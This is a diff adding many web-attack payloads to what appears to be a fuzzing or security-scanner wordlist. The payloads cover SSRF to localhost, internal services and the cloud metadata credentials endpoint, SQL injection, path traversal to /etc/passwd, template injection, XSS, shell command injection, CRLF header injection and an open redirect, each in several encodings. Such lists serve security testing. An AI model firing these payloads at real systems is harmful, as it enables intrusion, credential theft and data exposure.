@@ -78,3 +78,164 @@ http%3A%2F%2Flocalhost_1
 ssrf_1
 /ssrf/1
 http://localhost%0a1
+http://127.0.0.1:22/
+http%3A%2F%2F127.0.0.1%3A22%2F
+http%253A%252F%252F127.0.0.1%253A22%252F
+HTTP://127.0.0.1:22/
+http://127.0.0.1:22/?aurose=1
+http://127.0.0.1:22/&aurose=1
+http://localhost:8080/admin
+http%3A%2F%2Flocalhost%3A8080%2Fadmin
+http%253A%252F%252Flocalhost%253A8080%252Fadmin
+HTTP://LOCALHOST:8080/ADMIN
+http://localhost:8080/admin?aurose=1
+http://localhost:8080/admin&aurose=1
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F
+http%253A%252F%252F169.254.169.254%252Flatest%252Fmeta-data%252Fiam%252Fsecurity-credentials%252F
+HTTP://169.254.169.254/LATEST/META-DATA/IAM/SECURITY-CREDENTIALS/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/?aurose=1
+http://169.254.169.254/latest/meta-data/iam/security-credentials/&aurose=1
+http://[::1]/
+http%3A%2F%2F%5B%3A%3A1%5D%2F
+http%253A%252F%252F%255B%253A%253A1%255D%252F
+HTTP://[::1]/
+http://[::1]/?aurose=1
+http://[::1]/&aurose=1
+http://0177.0.0.1/
+http%3A%2F%2F0177.0.0.1%2F
+http%253A%252F%252F0177.0.0.1%252F
+HTTP://0177.0.0.1/
+http://0177.0.0.1/?aurose=1
+http://0177.0.0.1/&aurose=1
+http://2130706433/
+http%3A%2F%2F2130706433%2F
+http%253A%252F%252F2130706433%252F
+HTTP://2130706433/
+http://2130706433/?aurose=1
+http://2130706433/&aurose=1
+gopher://127.0.0.1:6379/_INFO
+gopher%3A%2F%2F127.0.0.1%3A6379%2F_INFO
+gopher%253A%252F%252F127.0.0.1%253A6379%252F_INFO
+GOPHER://127.0.0.1:6379/_INFO
+gopher://127.0.0.1:6379/_INFO?aurose=1
+gopher://127.0.0.1:6379/_INFO&aurose=1
+dict://127.0.0.1:11211/stats
+dict%3A%2F%2F127.0.0.1%3A11211%2Fstats
+dict%253A%252F%252F127.0.0.1%253A11211%252Fstats
+DICT://127.0.0.1:11211/STATS
+dict://127.0.0.1:11211/stats?aurose=1
+dict://127.0.0.1:11211/stats&aurose=1
+file:///etc/hostname
+file%3A%2F%2F%2Fetc%2Fhostname
+file%253A%252F%252F%252Fetc%252Fhostname
+FILE:///ETC/HOSTNAME
+file:///etc/hostname?aurose=1
+file:///etc/hostname&aurose=1
+http://0x7f000001/
+http%3A%2F%2F0x7f000001%2F
+http%253A%252F%252F0x7f000001%252F
+HTTP://0X7F000001/
+http://0x7f000001/?aurose=1
+http://0x7f000001/&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+http://127.0.0.1:22/::var0
+http%3A%2F%2F127.0.0.1%3A22%2F::v0
+/ssrf/probe/0
+http://localhost:8080/admin::var1
+http%3A%2F%2Flocalhost%3A8080%2Fadmin::v1
+/ssrf/probe/1
+http://169.254.169.254/latest/meta-data/iam/security-credentials/::var2
+http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F::v2
+/ssrf/probe/2
+http://[::1]/::var3
+http%3A%2F%2F%5B%3A%3A1%5D%2F::v3
+/ssrf/probe/3
+http://0177.0.0.1/::var4
+http%3A%2F%2F0177.0.0.1%2F::v4
+/ssrf/probe/4
+http://2130706433/::var5
+http%3A%2F%2F2130706433%2F::v5
+/ssrf/probe/5
+gopher://127.0.0.1:6379/_INFO::var6
+gopher%3A%2F%2F127.0.0.1%3A6379%2F_INFO::v6
+/ssrf/probe/6
+dict://127.0.0.1:11211/stats::var7
+dict%3A%2F%2F127.0.0.1%3A11211%2Fstats::v7
+/ssrf/probe/7
